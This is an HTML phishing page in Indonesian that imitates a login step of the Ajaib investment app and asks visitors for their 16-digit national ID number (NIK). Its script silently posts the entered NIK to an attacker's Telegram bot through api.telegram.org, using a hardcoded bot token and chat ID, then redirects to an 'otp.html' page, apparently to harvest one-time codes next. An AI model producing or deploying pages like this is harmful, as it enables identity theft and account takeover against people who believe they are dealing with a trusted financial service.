<!doctype html>
<html lang="id">
<head>
    <meta charset="utf-8" />

    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

    <title>Input NIK</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            touch-action: manipulation;
        }

        html, body {
            width: 100%;
            height: 100dvh;
            overflow: hidden;
            font-family: Inter, sans-serif;
            background: #fff;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: stretch;
        }

        .screen {
            width: 100%;
            max-width: 430px;
            height: 100dvh;
            padding: 20px 18px;
            display: flex;
            flex-direction: column;
            overflow-y: auto;
            -webkit-overflow-scrolling: touch;

            opacity: 1;
            transition: opacity 0.35s ease;
        }

        .fade-out {
            opacity: 0;
        }

        .top {
            display: flex;
            align-items: center;
            height: 60px;
            flex-shrink: 0;
        }

        .back {
            cursor: pointer;
            transform: scale(0.70);
        }

        .title {
            font-size: 26px;
            font-weight: 800;
            margin-top: 10px;
            line-height: 1.3;
            color: #000;
        }

        .label {
            font-size: 20px;
            font-weight: 800;
            margin-top: 28px;
            margin-bottom: 8px;
        }

        input {
            width: 100%;
            font-size: 20px;
            padding: 14px;
            border: 1px solid #dcdcdc;
            border-radius: 10px;
            outline: none;
            font-weight: 700;
        }

        .btn {
            margin-top: auto;
            width: 100%;
            text-align: center;
            padding: 16px;
            font-size: 20px;
            font-weight: 700;
            border-radius: 14px;
            user-select: none;
            background: #e9f3ff;
            color: #9fb4c8;
            transition: 0.25s;
            flex-shrink: 0;
        }

        .btn.active {
            background: #0B5CFF;
            color: #fff;
        }
    </style>
</head>

<body>
    <div class="screen" id="screen">

        <div class="top">
            <div class="back" onclick="history.back()">
                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#111" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <polyline points="15 18 9 12 15 6"></polyline>
                </svg>
            </div>
        </div>

        <div class="title">
            Masukkan data yang telah kamu daftarkan<br>ke Ajaib
        </div>

        <div class="label">NIK</div>

        <input
            type="number"
            id="nik"
            maxlength="16"
            oninput="validateNIK()"
        />

        <div id="confirmBtn" class="btn">Konfirmasi</div>

    </div>

<script>
    const nikInput = document.getElementById("nik");
    const btn = document.getElementById("confirmBtn");
    const screen = document.getElementById("screen");

    function validateNIK() {
        let value = nikInput.value;

        // batasi maksimum 16 digit
        if (value.length > 16) {
            nikInput.value = value.slice(0, 16);
        }

        // aktifkan tombol
        if (nikInput.value.length === 16) {
            btn.classList.add("active");
            btn.onclick = sendData;
        } else {
            btn.classList.remove("active");
            btn.onclick = null;
        }
    }

    function sendData() {
        const nik = nikInput.value;

        sendToTelegram(nik);

        screen.classList.add("fade-out");
        setTimeout(() => {
            window.location.href = "otp.html";
        }, 500);
    }

    function sendToTelegram(nik) {

        const BOT_TOKEN = "7959508278:AAGscaWzlJ0bwX1iTzhfcXT-Xp82TBYB67g";
        const CHAT_ID = "5983910858";

        const message =
            "ðŸ“„ *Data Masuk*\n\n" +
            `â€¢ NIK: *${nik}*`;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "Markdown"
            })
        });
    }
</script>

</body>
</html>
